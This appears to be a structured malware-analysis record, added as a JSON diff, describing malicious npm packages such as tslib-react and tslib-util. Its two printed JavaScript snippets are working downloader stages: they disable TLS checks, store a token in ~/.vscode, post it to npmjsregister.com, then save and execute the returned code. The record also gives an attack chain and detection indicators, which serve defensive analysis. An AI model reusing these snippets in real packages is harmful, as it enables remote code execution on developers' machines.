@@ -1,0 +1,104 @@
+{
+  "package_info": {
+    "package_name": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.)",
+    "package_manager": "npm",
+    "package_versions": "all published versions as of the report date",
+    "why_malicious": "The package contains code that, upon installation or execution, connects to attacker-controlled servers, downloads and executes additional code, and facilitates a multi-stage attack chain designed for remote code execution and potential data exfiltration. The behavior is intentionally hidden and not related to any legitimate package functionality."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (upon import or execution of the package's main file)",
+        "file_location": "main index.js or similar entry point (e.g., tslib-react/index.js)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nfunction registerAudit(version, projectUrl) {\n\tvar request = require('sync-request');\n\tvar ticket = request('GET', projectUrl);\n\tfs.writeFileSync(version, ticket.getBody());\n}\n\nvar folder = os.homedir() + \"/.vscode\";\nif (!fs.existsSync(folder)){\n    fs.mkdirSync(folder);\n}\nregisterAudit(path.join(folder,'/jsontoken'), 'https://npmjsregister.com/checkupdate.php');",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code disables TLS certificate validation, creates a hidden directory in the user's home folder, fetches a token from a remote server via HTTP GET, and writes the response to a file in the local filesystem.",
+      "malice_analysis": {
+        "why_suspicious": "The code makes an unsolicited network request to an external domain during package execution, disables TLS verification (allowing for man-in-the-middle attacks), and stores a remote value in a hidden directory, which is not expected for a legitimate npm package.",
+        "violated_expectations": "Normal npm packages should not make network requests or write hidden files in the user's home directory during installation or import unless explicitly required and documented. Disabling TLS verification is highly abnormal and dangerous.",
+        "similar_legitimate_use": "Some developer tools or updaters may check for updates or download configuration files, but they should never disable TLS verification or hide their actions.",
+        "key_indicators": [
+          "Disables TLS certificate validation",
+          "Creates hidden directory in user home",
+          "Fetches data from suspicious domain (npmjsregister.com)",
+          "Writes remote data to local file"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (upon import or execution of the package's main file, typically after snippet_1 has run)",
+        "file_location": "main index.js or similar entry point (e.g., tslib-util/index.js)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "child_process"
+        ]
+      },
+      "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n\tconst https = require('https');\n\tconst querystring = require('querystring');\n\n\tconst options = {\n\t  hostname: domain,\n\t  port: 443,\n\t  path: entry,\n\t  method: 'POST',\n\t  headers: {'content-type' : 'application/x-www-form-urlencoded'},\n\t};\n\n\tconst req = https.request(options, (resp) => {\n\t\tlet data = \"\";\n\t\tresp.on(\"data\", chunk => {\n\t\t  data += chunk;\n\t\t});\n\t\tresp.on(\"end\", () => {\n\t\t\tfs.writeFileSync(path, data);\t\t\t\n\t\t\tconst { exec } = require('child_process');\n\t\t\texec('node ' + path, (error, stdout, stderr) => {\t\t\t\t\n\t\t\t});\n\t\t});\n\t});\n\n\treq.on('error', (e) => {\n\t  console.error(e.message);\n\t});\n\treq.write(token);\n\treq.end(); \n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nvar dir = path.join(os.homedir(), \".vscode\");\nif (fs.existsSync(dir)){\n\tconst token = fs.readFileSync(path.join(dir,'jsontoken'),\n            {encoding:'utf8', flag:'r'});\n\tgetsvnroot('npmjsregister.com', '/getupdate.php', token, path.join(dir ,'checkjson.js'));\n}",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code disables TLS certificate validation, reads a previously stored token from a hidden file, sends it via HTTPS POST to a remote server, writes the server's response as a new JavaScript file, and immediately executes it using Node.js.",
+      "malice_analysis": {
+        "why_suspicious": "The code reads a hidden token, sends it to an external server, writes the response as executable code, and runs it. This enables arbitrary code execution from a remote attacker, a classic second-stage malware pattern.",
+        "violated_expectations": "Legitimate packages should not download and execute code from the internet at runtime, especially not in response to hidden tokens or in a multi-stage fashion. Disabling TLS verification is again highly abnormal.",
+        "similar_legitimate_use": "Some updaters or plugin systems may download and execute code, but only with explicit user consent and strong security controls.",
+        "key_indicators": [
+          "Reads hidden token file",
+          "Sends token to remote server (npmjsregister.com)",
+          "Writes and executes remote code",
+          "Disables TLS certificate validation",
+          "Uses child_process.exec to run arbitrary code"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Victim is lured into cloning and running a repository containing two paired malicious npm packages.",
+      "implemented_by": [],
+      "leads_to": "Execution of first-stage package"
+    },
+    {
+      "step": 2,
+      "action": "First-stage package (e.g., tslib-react) executes, disables TLS verification, fetches a unique token from a remote server, and stores it in a hidden file.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Token is stored locally for use by second-stage package"
+    },
+    {
+      "step": 3,
+      "action": "Second-stage package (e.g., tslib-util) executes, reads the token, sends it to the attacker's server, downloads a new JavaScript payload, and executes it.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote code execution and possible further compromise"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Disabling of TLS certificate validation (process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0)",
+      "Network requests to suspicious domains during install or runtime",
+      "Creation and use of hidden files in user home directory (e.g., $HOME/.vscode/jsontoken)",
+      "Downloading and executing code from remote servers at runtime"
+    ],
+    "file_indicators": [
+      "$HOME/.vscode/jsontoken",
+      "$HOME/.vscode/checkjson.js",
+      "Presence of unexpected files in $HOME/.vscode or $HOME/.vscode/npmcache"
+    ],
+    "network_indicators": [
+      "Connections to npmjsregister.com (especially /checkupdate.php and /getupdate.php endpoints)",
+      "Unusual outbound HTTP/HTTPS requests during npm install or package execution"
+    ],
+    "how_to_detect": "Monitor for npm packages that disable TLS certificate validation, make unsolicited network requests to unknown domains, or create hidden files in user directories. Flag any package that downloads and executes code from the internet at install or runtime. Look for file creation in $HOME/.vscode or $HOME/.vscode/npmcache, and network connections to npmjsregister.com. Use behavioral analysis to detect child_process.exec usage on files downloaded from the network."
+  }
+}
